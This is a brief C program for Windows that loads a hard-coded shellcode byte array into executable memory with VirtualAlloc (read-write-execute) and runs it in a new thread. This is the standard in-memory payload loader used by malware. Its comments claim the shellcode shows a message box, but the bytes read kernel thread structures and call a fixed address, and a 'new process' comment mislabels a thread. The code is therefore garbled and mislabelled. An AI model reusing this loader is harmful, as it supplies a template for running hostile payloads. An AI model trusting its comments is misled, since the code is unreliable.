#include <windows.h>
#include <stdio.h>

int main()
{
    // Shellcode to create a message box
    char shellcode[] = "\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x8b\xc8\xba\x04\x00\x00\x00\xb8\x00\x10\x00\x00\xff\xd0\x31\xc0\x8b\x80\x24\x01\x00\x00\x64\x8b\x40\x18\x8b\xc8\xba\x04\x00\x00\x00\xb8\x00\x10\x00\x00\xff\xd0";

    // Allocate memory for the shellcode
    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode to the newly allocated memory
    memcpy(exec, shellcode, sizeof shellcode);

    // Create a new process
    DWORD threadId;
    HANDLE hThread = CreateThread(NULL, 0, exec, NULL, 0, &threadId);

    // Wait for the new process to complete
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    VirtualFree(exec, sizeof shellcode, MEM_RELEASE);

    return 0;
}